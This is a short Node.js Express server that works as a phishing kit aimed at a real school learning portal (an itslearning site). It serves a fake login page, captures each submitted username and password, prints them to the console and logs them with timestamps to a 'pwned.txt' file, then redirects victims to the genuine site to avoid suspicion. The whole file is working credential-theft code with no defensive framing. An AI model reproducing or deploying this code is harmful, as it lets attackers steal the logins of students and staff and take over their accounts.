const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const port = 3000;
const path = require("path");
const chalk = require("chalk");
const fs = require("fs");


const logfile = "./pwned.txt";
const redirectwebsite = "https://rfk.itslearning.com/main.aspx?TextURL=CourseCards";
        //Might raise some sus bcuz if the person has not logged in a while they will be redirected back screen before the login.

app.use(bodyParser.urlencoded({ extended: false }));

app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, "main.html"));
  });

app.post('/login', (req, res)=>{
    //Get current time, so we know when the phishing happened
    var today = new Date();
    var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    var dateTime = date+' '+time;

    //Print the phishing to the console.
    console.log(chalk.green("###########################################"));
    console.log(chalk.green("Username phished: ") + req.body.username); //Username phished
    console.log(chalk.green("Password phished: ") + req.body.password); //Password phished
    console.log(chalk.green("Time phished: ") + dateTime); //Time when phished user.
    console.log(chalk.green("###########################################"));

    //Log the phish to a pwn file.
    var toLog = "###########################################\nUsername: " + req.body.username + "\nPassword: " + req.body.password + "\nTime: " + dateTime + "\n###########################################\n\n";
    if(fs.existsSync(logfile)){
        fs.appendFileSync(logfile, toLog); //Not appending?
    } else {
        fs.writeFileSync(logfile, toLog);
    }

    //Redirect the user to the correct website.
    res.redirect(redirectwebsite);
});


app.listen(port, () => {
    console.log(`Running on port : ${port}`)
})
